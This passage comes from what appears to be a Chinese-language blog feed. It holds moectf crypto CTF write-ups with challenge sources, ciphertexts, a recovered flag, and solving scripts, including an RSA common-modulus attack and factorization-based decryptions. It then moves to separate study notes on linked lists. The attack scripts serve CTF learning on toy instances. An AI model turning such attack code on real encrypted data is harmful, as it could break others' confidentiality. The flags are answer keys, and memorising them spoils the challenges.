class="hljs-string">P20 = 18390046459144888243</span><br><span class="hljs-string">P20 = 12404642343676224637</span><br><span class="hljs-string">P20 = 18106525049998616747</span><br><span class="hljs-string">P20 = 11853704782834170959</span><br><span class="hljs-string">P20 = 17543713628803023199</span><br><span class="hljs-string">P20 = 10049235158029375571</span><br><span class="hljs-string">P20 = 12448177342966243757</span><br><span class="hljs-string">P20 = 17265001711647542137</span><br><span class="hljs-string">P20 = 10547615587767500213</span><br><span class="hljs-string">P20 = 16408421615173973083&#x27;&#x27;&#x27;</span><br><br>factor = <span class="hljs-built_in">list</span>(<span class="hljs-built_in">map</span>(<span class="hljs-built_in">int</span>,[i.split()[-<span class="hljs-number">1</span>] <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> factor.split(<span class="hljs-string">&#x27;\n&#x27;</span>)]))<br>phin = reduce(<span class="hljs-keyword">lambda</span> a,b:a*(b-<span class="hljs-number">1</span>),[<span class="hljs-number">1</span>] + factor)<br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phin)<br>m2 = <span class="hljs-built_in">pow</span>(c2,d,n2)<br><br><span class="hljs-comment"># print(bytes.fromhex(hex(pow(c2,d,n2))[2:]))</span><br><br><br><span class="hljs-built_in">print</span>(long_to_bytes(m2))<br><span class="hljs-comment"># b&#x27;moectf&#123;fACtord6_And_YAfu_Are_6oth_good_utils_to_fACtorize_num6ers_ff90S&#125;&#x27;</span><br></code></pre></td></tr></table></figure><h2 id="feistel">feistel</h2><h3 id="main-2">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br><span class="hljs-built_in">round</span> = <span class="hljs-number">2</span><br>flag = <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;./secret&quot;</span>, <span class="hljs-string">&quot;rb&quot;</span>).read().strip()<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">f</span>(<span class="hljs-params">m, key</span>):<br>    m = m ^ (m &gt;&gt; <span class="hljs-number">4</span>)<br>    m = m ^ (m &lt;&lt; <span class="hljs-number">5</span>)<br>    m = m ^ (m &gt;&gt; <span class="hljs-number">8</span>)<br>    m ^= key<br>    m = (m * <span class="hljs-number">1145</span> + <span class="hljs-number">14</span>) % <span class="hljs-number">2</span>**<span class="hljs-number">64</span><br>    m = (m * <span class="hljs-number">1919</span> + <span class="hljs-number">810</span>) % <span class="hljs-number">2</span>**<span class="hljs-number">64</span><br>    m = (m * key) % <span class="hljs-number">2</span>**<span class="hljs-number">64</span><br>    <span class="hljs-keyword">return</span> m<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">enc</span>(<span class="hljs-params">m, key, <span class="hljs-built_in">round</span></span>):<br>    key = bytes_to_long(key)<br>    left = bytes_to_long(m[:<span class="hljs-number">8</span>])<br>    right = bytes_to_long(m[<span class="hljs-number">8</span>:])<br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-built_in">round</span>):<br>        left, right = right, f(right, key) ^ left<br>    left, right = right, left<br>    <span class="hljs-keyword">return</span> long_to_bytes(left).rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>) + long_to_bytes(right).rjust(<span class="hljs-number">8</span>, <span class="hljs-string">b&quot;\x00&quot;</span>)<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">padding</span>(<span class="hljs-params">m</span>):<br>    mlen = <span class="hljs-built_in">len</span>(m)<br>    pad = <span class="hljs-number">16</span> - mlen % <span class="hljs-number">16</span><br>    <span class="hljs-keyword">return</span> m + pad * <span class="hljs-built_in">bytes</span>([pad])<br><br><br><span class="hljs-keyword">def</span> <span class="hljs-title function_">ecb_enc</span>(<span class="hljs-params">m, key</span>):<br>    m = padding(m)<br>    mlen = <span class="hljs-built_in">len</span>(m)<br>    c = <span class="hljs-string">b&quot;&quot;</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(mlen // <span class="hljs-number">16</span>):<br>        c += enc(m[i * <span class="hljs-number">16</span> : i * <span class="hljs-number">16</span> + <span class="hljs-number">16</span>], key, <span class="hljs-built_in">round</span>)<br>    <span class="hljs-keyword">return</span> c<br><br><br><span class="hljs-built_in">print</span>(ecb_enc(flag, <span class="hljs-string">b&quot;wulidego&quot;</span>))<br><br><span class="hljs-comment"># b&#x27;\x0b\xa7\xc6J\xf6\x80T\xc6\xfbq\xaa\xd8\xcc\x95\xad[\x1e\&#x27;W5\xce\x92Y\xd3\xa0\x1fL\xe8\xe1&quot;^\xad&#x27;</span><br><br></code></pre></td></tr></table></figure><h2 id="nn">n&amp;n</h2><h3 id="main-3">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>p = getPrime(<span class="hljs-number">1024</span>)<br>q = getPrime(<span class="hljs-number">1024</span>)<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&quot;flag.txt&quot;</span>,<span class="hljs-string">&quot;r&quot;</span>) <span class="hljs-keyword">as</span> f:<br>    flag = f.read().strip().encode()<br><br>m = bytes_to_long(flag)<br>n = p * q<br>e1 = <span class="hljs-number">0x114514</span><br>e2 = <span class="hljs-number">19198101</span><br><br>c1 = <span class="hljs-built_in">pow</span>(m,e1,n)<br>c2 = <span class="hljs-built_in">pow</span>(m,e2,n)<br><span class="hljs-built_in">print</span>(c1) <br><span class="hljs-built_in">print</span>(c2)<br><span class="hljs-built_in">print</span>(n)<br><br><span class="hljs-comment"># 5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span><br><span class="hljs-comment"># 4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span><br><span class="hljs-comment"># 13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span><br></code></pre></td></tr></table></figure><h3 id="exp-4">exp</h3><p>共模攻击，用的脚本</p><p><u>这里十六进制的e1竟然不用转换</u></p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><span class="hljs-keyword">from</span> gmpy2 <span class="hljs-keyword">import</span> gmpy2<br> <br>c1 = <span class="hljs-number">5776799746376051463605370130675046329799612910435315968508603116759552095183027263116443417343895252766060748671845650457077393391989018107887540639775168897954484319381180406512474784571389477212123123540984850033695748142755414954158933345476509573211496722528388574841686164433315356667366007165419697987147258498693175698918104120849579763098045116744389310549687579302444264316133642674648294049526615350011916160649448726069001139749604430982881450187865197137222762758538645387391379108182515717949428258503254717940765994927802512049427407583200118969062778415073135339774546277230281966880715506688898978925</span><br>c2 = <span class="hljs-number">4664955020023583143415931782261983177552050757537222070347847639906354901601382630034645762990079537901659753823666851165175187728532569040809797389706253282757017586285211791297567893874606446000074515260509831946210526182765808878824360460569061258723122198792244018463880052389205906620425625708718545628429086424549277715280217165880900037900983008637302744555649467104208348070638137050458275362152816916837534704113775562356277110844168173111385779258263874552283927767924979691542028126412133709129601685315027689094437957165812994784648540588277901241854031439324974562449032290219652206466731675967045633360</span><br>e1 = <span class="hljs-number">0x114514</span><br>e2 = <span class="hljs-number">19198101</span><br><br><span class="hljs-comment"># e1 = int(str(e1), 16) </span><br><br><br>n = <span class="hljs-number">13612969130810965900902742090064423006385890357159609755971027204203418808937093492927060428980020085273603754747223030702684866992231913349067578014240319426522039068836171388168087260774376277346092066880984406890296520951318296354893551565670293486797637522297989653182109744864444697818991039473180752980752117041574628063002176339235126861152739066489620021077091941250365101779354009854706729448088217051728432010328667839532327286559570597994183126402340332924370812383312664419874352306052467284992411543921858024469098268800500500651896608097346389396273293747664441553194179933758992070398387066135330851531</span><br><br><br> <br><span class="hljs-keyword">def</span> <span class="hljs-title function_">RSA_ComModAtk</span>(<span class="hljs-params">e1, e2, c1, c2, n</span>):<br>    e1, e2, c1, c2, n = <span class="hljs-built_in">int</span>(e1), <span class="hljs-built_in">int</span>(e2), <span class="hljs-built_in">int</span>(c1), <span class="hljs-built_in">int</span>(c2), <span class="hljs-built_in">int</span>(n)<br>    <span class="hljs-keyword">if</span> gmpy2.gcd(e1,e2) ==<span class="hljs-number">1</span>:<br>        s = gmpy2.gcdext(e1, e2)  <span class="hljs-comment"># 扩展欧几里得算法-辗转相除法使得  x*e1+y*e2=1,求出t和z</span><br>        x = s[<span class="hljs-number">1</span>]<br>        y = s[<span class="hljs-number">2</span>]<br>        <span class="hljs-keyword">if</span> x &lt; <span class="hljs-number">0</span>:<br>            x = - x  <span class="hljs-comment"># 变指数为正值</span><br>            c1 = gmpy2.invert(c1, n)  <span class="hljs-comment"># 求c1的逆元</span><br>        <span class="hljs-keyword">if</span> y &lt; <span class="hljs-number">0</span>:<br>            y = -y  <span class="hljs-comment"># 变指数为正值</span><br>            c2 = gmpy2.invert(c2, n)  <span class="hljs-comment"># 求c2的逆元</span><br>        m = (<span class="hljs-built_in">pow</span>(c1, x, n) * <span class="hljs-built_in">pow</span>(c2, y, n)) % n  <span class="hljs-comment"># (c1^x*c2^y)%n=m^e1x*me2y%n=m^(e1x+e2y)%n=m%n=m</span><br>        <span class="hljs-keyword">return</span> m<br>    <span class="hljs-keyword">else</span> :<br>        <span class="hljs-keyword">return</span> bytes_to_long(<span class="hljs-string">b&#x27;e1 and e2 are not relatively prime&#x27;</span>) <span class="hljs-comment"># e1和e2不互质</span><br>    <br><br>m = RSA_ComModAtk(e1, e2, c1, c2, n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))<br></code></pre></td></tr></table></figure><h2 id="factorize_me">factorize_me!</h2><h3 id="main-4">main</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> getPrime<br><span class="hljs-keyword">from</span> math <span class="hljs-keyword">import</span> prod<br><span class="hljs-keyword">from</span> sympy <span class="hljs-keyword">import</span> nextprime<br><span class="hljs-keyword">from</span> random <span class="hljs-keyword">import</span> choices<br><br><span class="hljs-keyword">with</span> <span class="hljs-built_in">open</span>(<span class="hljs-string">&#x27;flag.txt&#x27;</span>, <span class="hljs-string">&#x27;rb&#x27;</span>) <span class="hljs-keyword">as</span> fs:<br>    flag = fs.read().strip()<br><br>primes = [getPrime(<span class="hljs-number">512</span>) <span class="hljs-keyword">for</span> _ <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">9</span>)]<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;prod(primes) = &#125;</span>&quot;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&quot;<span class="hljs-subst">&#123;prod(p - <span class="hljs-number">1</span> <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> primes) = &#125;</span>&quot;</span>)<br><br>primes2 = [nextprime(p) <span class="hljs-keyword">for</span> p <span class="hljs-keyword">in</span> choices(primes, k=<span class="hljs-number">3</span>)]<br>n = prod(primes2)<br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-built_in">pow</span>(<span class="hljs-built_in">int</span>.from_bytes(flag, <span class="hljs-string">&#x27;big&#x27;</span>), e, n)<br><br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;n = <span class="hljs-subst">&#123;n&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;e = <span class="hljs-subst">&#123;e&#125;</span>&#x27;</span>)<br><span class="hljs-built_in">print</span>(<span class="hljs-string">f&#x27;c = <span class="hljs-subst">&#123;c&#125;</span>&#x27;</span>)<br><br><span class="hljs-comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836866602305788131186220057989320357344904731322223310531945208433910803617954798258382169132907508787682006064930747033681966462568715421005454243255297306718356766130469885581576362173340673516476386201173298433892314145854649884922769732583885904512624543994675379894718657682146178638074984373206937523380103438050549181568015985546172618830480078894445808092527561363650503540062128543705172678754195578429520889784813733491180748361345720247750720179608752244490362713103319685024237941527268458213442611663415417005556439749055222361212059968254748751273361732365487788593341859760309778894350385339764442343374673786357175846291309425081492959910254127778240522152676060766139057453197528944251599979227271074508795482632471242983094008619339488744362509349734218480932255216087706001484182136783834973304870508270118505737767002256270427907341952256516206663258530300791364944105025764611810001781971638030661367630116818647252727909489405550104641122269772492252464714694507693447974171377200402508765841829763548525530878309985480248379655169722567051495205792089930014228403456098065971372039443284193603395249634283366194562380309469628114581468645669390610963076340643757972439104287127375438663839421605531570285615180251</span><br><span class="hljs-comment"># 363364907814244019888662301376841344262476227242899756862391470731421569394957444030214887114615748277199649349781524749919652160244484352285668794188836492373364350673588273863828369502073826782362255108313852264064760467561392054178047091483873483255491431451728274259516789065331176728192953741805933100379191778599394515981288225535175013258094287912195847642598436035132783919453991516358280321085873745330313812205910011387125778714795906023110368957596998222544234082487264006696812862179916726781327290284827659294751262185328816323311831349296593013038823107653943652771448719760448938995150646738377177532550757319539185878535087009904848382493668686831331474113789651777885239747000076063679062106375348803749466079052774597412239427050432901553466002731972993029311850718200685157193170716432600165476733200831046297530470544781309612128231925681374239849452623513538498417735984094919756374577623486416462101457492789215144166273775249387638107644634704270216130852885082174564648445147377239033930079759024399532146184753110240154062693457622208373371290126810856885343328090305620627668495081760346853701632815149478447405718664667978825807101325764916405446176183238866136433205933785973568759281210319422288153910340542098573782006262190181726245838857185687242960093445000287347616796984610291664809895901301187179157382169999966124177588884152267266994164841066291200</span><br><span class="hljs-comment"># n = 899081756851564072995842371038848265712822308942406479625157544735473115850983700580364485532298999127834142923262920189902691972009898741820291331257478170998867183390650298055916005944577877856728843264502218692432679062445730259562784479410120575777748292393321588239071577384218317338474855507210816917917699500763270490789679076190405915250953860114858086078092945282693720016414837231157788381144668395364877545151382171251673050910143023561541226464220441</span><br><span class="hljs-comment"># e = 65537</span><br><span class="hljs-comment"># c = 841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span><br></code></pre></td></tr></table></figure><h3 id="exp-5">exp</h3><p><strong>[RSA1]P7</strong>，直接分解n运算即可</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><code class="hljs python"><span class="hljs-keyword">from</span> Crypto.Util.number <span class="hljs-keyword">import</span> *<br><br>e = <span class="hljs-number">65537</span><br>c = <span class="hljs-number">841335863342518623856757469220437045493934999201203757845757404101093751603513457430254875658199946020695655428637035628085973393246970440054477600379027466651143466332405520374224855994531411584946074861018245519106776529260649700756908093025092104292223745612991818151040610497258923925952531383407297026038305824754456660932812929344928080812670596607694776017112795053283695891798940700646874515366341575417161087304105309794441077774052357656529143940010140</span><br><br>p = <span class="hljs-number">6991223361118904775931217829045348785013077549030883418924453538830605687999480005714979700653172534877541317997174968789510984315425270755055110913347349</span><br>q = <span class="hljs-number">9987009117206906203158749743824168660291275882852229158070368815160479543708376165641735042845357978292384303332559592302507789120810447986634662721490849</span><br>r = <span class="hljs-number">12876877424944854147075816504195994138450356002779004886384584287813869165469217718717854027672044903401715370348223932937626725119320180795716270261309141</span><br><br><br>n = p * q * r<br>phi = (p-<span class="hljs-number">1</span>)*(q-<span class="hljs-number">1</span>)*(r-<span class="hljs-number">1</span>)<br><br>d = <span class="hljs-built_in">pow</span>(e,-<span class="hljs-number">1</span>,phi)<br>m = <span class="hljs-built_in">pow</span>(c,d,n)<br><br><span class="hljs-built_in">print</span>(long_to_bytes(m))  <br><br><span class="hljs-comment"># 不知道上面给那两个大数是干啥的</span><br></code></pre></td></tr></table></figure>]]></content>
    
    
    <categories>
      
      <category>CTF-Crypto</category>
      
    </categories>
    
    
    <tags>
      
      <tag>CTF</tag>
      
      <tag>Crypto</tag>
      
    </tags>
    
  </entry>
  
  
  
  <entry>
    <title>数据结构学习</title>
    <link href="/2023/09/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/"/>
    <url>/2023/09/19/%E6%95%B0%E6%8D%AE%E7%BB%93%E6%9E%84%E5%AD%A6%E4%B9%A0/</url>
    
    <content type="html"><![CDATA[<h2 id="第二章-线性表">第二章 线性表</h2><h3 id="section">2.5</h3><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><code class="hljs abnf"><span class="hljs-attribute">L</span><span class="hljs-operator">=</span>(LinkList)malloc(sizeof(LNode))<span class="hljs-comment">; P=L;</span><br>for(i<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;i&lt;=4;i++)&#123;</span><br>    P-&gt;next<span class="hljs-operator">=</span>(LinkList)malloc(sizeof(LNode))<span class="hljs-comment">;</span><br>P<span class="hljs-operator">=</span>P-&gt;next<span class="hljs-comment">; </span><br>P-&gt;data<span class="hljs-operator">=</span>i*<span class="hljs-number">2</span>-<span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br>P-&gt;next<span class="hljs-operator">=</span>NULL<span class="hljs-comment">;</span><br>for(i<span class="hljs-operator">=</span><span class="hljs-number">4</span><span class="hljs-comment">;i&gt;=1;i--) Ins_LinkList(L,i+1,i*2);</span><br>for(i<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;i&lt;=3;i++) Del_LinkList(L,i);</span><br></code></pre></td></tr></table></figure><p><code>L=(LinkList)malloc(sizeof(LNode));</code></p><p>这行代码是C或C++中用于动态分配内存并创建一个链表（或链表的头节点）的代码。</p><p>这行代码作用的详细解释：</p><ol type="1"><li><code>malloc</code> 函数：<code>malloc</code>是C和C++中用于动态分配内存的函数。它的作用是在堆（heap）中分配一块指定大小的内存，并返回一个指向该内存块的指针。在这里，<code>malloc(sizeof(LNode))</code>分配了一块大小为 <code>sizeof(LNode)</code> 字节的内存。</li><li><code>sizeof(LNode)</code>：<code>sizeof</code>是一个运算符，用于获取数据类型或结构体的大小（以字节为单位）。<code>LNode</code>是链表节点的数据结构（或类型），因此 <code>sizeof(LNode)</code> 返回<code>LNode</code> 结构体的大小。</li><li><code>(LinkList)</code>强制类型转换：在C和C++中，<code>malloc</code> 返回一个 <code>void</code>指针，需要将其转换为所需的数据类型，这里是 <code>LinkList</code>类型。这样做是为了让指针指向正确的数据类型，以便后续操作。</li><li><code>L</code>：这是链表的头指针，它被分配了一块内存，并指向了链表的头节点。</li></ol><p>总结起来，这行代码的作用是创建一个链表，并将链表的头指针<code>L</code> 指向一个新分配的内存块，该内存块大小为<code>sizeof(LNode)</code> 字节，用来存储链表的头节点。</p><p>这是创建链表的起始步骤，通常会跟随其他操作来构建链表的节点和连接。在使用完链表后，需要记得使用<code>free</code>函数来释放分配的内存，以避免内存泄漏。例如：<code>free(L)</code>。</p><figure class="highlight abnf"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs abnf">for(i<span class="hljs-operator">=</span><span class="hljs-number">1</span><span class="hljs-comment">;i&lt;=4;i++)&#123;</span><br>    P-&gt;next<span class="hljs-operator">=</span>(LinkList)malloc(sizeof(LNode))<span class="hljs-comment">;</span><br>P<span class="hljs-operator">=</span>P-&gt;next<span class="hljs-comment">; </span><br>P-&gt;data<span class="hljs-operator">=</span>i*<span class="hljs-number">2</span>-<span class="hljs-number">1</span><span class="hljs-comment">;</span><br>&#125;<br></code></pre></td></tr></table></figure><p>这段代码是一个循环，它用于在链表中创建四个节点，并为每个节点赋值。解释如下：</p><ol type="1"><li><code>for(i=1;i&lt;=4;i++)</code>：这是一个循环，它会执行四次，<code>i</code>从1开始，每次递增1，直到 <code>i</code> 的值为4。</li><li><code>P-&gt;next=(LinkList)malloc(sizeof(LNode));</code>：这行代码分配了一个新的内存块，用于存储下一个节点，并将当前节点的<code>next</code>指针指向这个新节点。这意味着创建了一个新节点，并将其链接到链表中。</li><li><code>P=P-&gt;next;</code>：将指针 <code>P</code>移动到下一个节点。现在 <code>P</code>指向了新创建的节点，以便为它赋值。</li><li><code>P-&gt;data=i*2-1;</code>：为当前节点的 <code>data</code>成员赋值。这里应该是<code>P-&gt;data = i*2 - 1;</code>，将当前节点的数据设为 <code>i</code>乘以 2 减去 1 的结果。</li></ol><p>所以，这个循环会创建四个新的节点，并在每个节点的 <code>data</code>成员中存储一个奇数值（1、3、5、7）。</p><p>然后最后两行语句-----</p><ul><li><code>Ins_LinkList(L,i+1,i*2);</code>：调用了一个名为<code>Ins_LinkList</code> 的函数，将元素 <code>i*2</code> 插入到链表的第<code>i+1</code> 个位置。</li><li><code>Del_LinkList(L,i);</code>：调用了一个名为<code>Del_LinkList</code> 的函数，删除链表中的第 <code>i</code>个元素(<strong>这里是不算头节点的,因为头节点没有被赋予元素?????</strong>)。</li></ul><h3 id="section-1">2.6</h3><ul class="task-list"><li><label><input type="checkbox"checked="" /><code>while(P-&gt;next!=NULL) P=P-&gt;next;</code></label></li></ul><p>这行代码是一个 <code>while</code> 循环，其目的是在链表中移动指针<code>P</code> 直到 <code>P</code> 的下一个节点为<code>NULL</code>，也就是链表的末尾节点。</p><p>解释如下：</p><ol type="1"><li><code>P-&gt;next != NULL</code>：这是一个条件表达式，它检查当前节点<code>P</code> 的下一个节点是否不等于<code>NULL</code>。条件表达式的结果是一个布尔值，如果当前节点的下一个节点不是<code>NULL</code>，则条件为真，继续执行循环体。</li><li><strong><code>P = P-&gt;next;</code>：如果条件为真，就执行这行代码。这行代码将指针<code>P</code> 移动到下一个节点，即将 <code>P</code>更新为当前节点的下一个节点，以便继续检查下一个节点是否为链表的末尾。(终于理解😭)</strong></li></ol><p>循环将一直执行，直到 <code>P</code> 的下一个节点为<code>NULL</code>，也就是链表的末尾节点。一旦链表末尾被找到，条件表达式为假，循环终止。这段代码通常用于遍历整个链表，直到到达链表的末尾节点。</p><p>总之，这段代码的目的是在链表中移动指针 <code>P</code>直到达到链表的末尾节点。</p><p>已知 L 是带表头结点的非空单链表，和已知 L是无表头结点的单链表，有什么区别</p><h3 id="section-2">2.7</h3><p><strong>带表头结点</strong>和<strong>无表头结点</strong>的单链表在数据结构中有一些重要区别：</p><ol type="1"><li><strong>存在与否：</strong><ul><li><strong>带表头结点的单链表：</strong>这种链表在头部有一个额外的结点，通常称为表头结点或者哨兵结点。这个结点不存储实际的数据，它的主要目的是使链表操作更容易实现，因为它可以避免对空链表的特殊处理。带表头结点的链表通常在操作上更加统一，因为头结点始终存在，即使链表为空。</li><li><strong>无表头结点的单链表：</strong>这种链表不包含表头结点，直接从第一个存储数据的结点开始。这意味着如果链表为空，那么链表头部就是一个空指针，需要特殊处理。</li></ul></li><li><strong>索引/遍历起始点：</strong><ul><li><strong>带表头结点的单链表：</strong>由于头结点的存在，链表的第一个数据结点从头结点的下一个结点开始，索引为1。</li><li><strong>无表头结点的单链表：</strong>在没有头结点的情况下，链表的第一个数据结点通常是链表的头部，索引为0。</li></ul></li><li><strong>空链表处理：</strong><ul><li><strong>带表头结点的单链表：</strong>即使链表为空，头结点始终存在，因此对于空链表的处理与非空链表一样，不需要额外的特殊情况处理。</li><li><strong>无表头结点的单链表：</strong>如果链表为空，头部就是一个空指针，需要特殊处理，否则在访问链表时可能会引发错误。</li></ul></li><li><strong>操作实现的复杂性：</strong><ul><li><strong>带表头结点的单链表：</strong>由于头结点的存在，通常可以更容易地实现插入和删除操作，因为不需要特殊情况处理头部节点。</li><li><strong>无表头结点的单链表：</strong>操作实现可能稍微复杂一些，因为需要处理头部节点的特殊情况。</li></ul></li></ol><p>在实际应用中，选择使用带表头结点还是无表头结点的单链表取决于具体的需求和设计。带表头结点的链表通常在实现上更加统一和方便，而无表头结点的链表可能更节省一些内存空间。</p><p><strong>首元结点&amp;尾元结点</strong></p><p>判断:在带头结点的循环单链表中，尾元结点的next指针指向链表的首元结点。</p><blockquote><p>false</p><p>尾元结点的next值指向链表的头节点，而不是首元结点。</p><p>首元结点指的是链表中存储第一个数据元素的结点。头节点是在首元结点之前设置的一个结点。</p></blockquote><figure><imgsrc="https://cdn.jsdelivr.net/gh/viper2383/blogimages/blog-imgimage-20230919200445761.png"alt="image-20230919200445761" /><figcaption 